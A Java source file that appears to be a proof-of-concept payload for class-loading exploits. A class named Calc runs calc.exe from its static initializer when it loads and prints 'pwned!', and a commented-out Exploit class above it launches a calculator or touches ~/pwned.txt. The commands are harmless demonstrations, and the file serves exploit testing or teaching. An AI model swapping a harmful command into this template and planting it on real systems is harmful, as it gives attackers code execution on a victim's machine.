/*
public class Exploit {
    public Exploit() {}
    static {
        try {
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"open","/System/Applications/Calculator.app"};

		String[] cmds = new String[]{"touch", "~/pwned.txt"};
//		String txt = "hello world";
//		String[] writecmds = new String[]{"echo", txt, ">>", "~/pwned.txt"}; 

	    	java.lang.Runtime.getRuntime().exec(cmds).waitFor();
//	    	java.lang.Runtime.getRuntime().exec(writecmds).waitFor();

        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}
		    */

public class Calc {
	static {
		try{
			String[] cmds = new String[]{"cmd.exe", "-c" , "calc.exe"};
			System.out.println("start calc");
			java.lang.Runtime.getRuntime().exec(cmds).waitFor();
			System.out.println("finished calc");
		
		
		} catch (Exception e) {
			e.printStackTrace();
		}	
	
	}
	public Calc() {
		System.out.println("pwned!");
	
	}
	public static void main(String[] args) {
		Calc e = new Calc();

	}
}

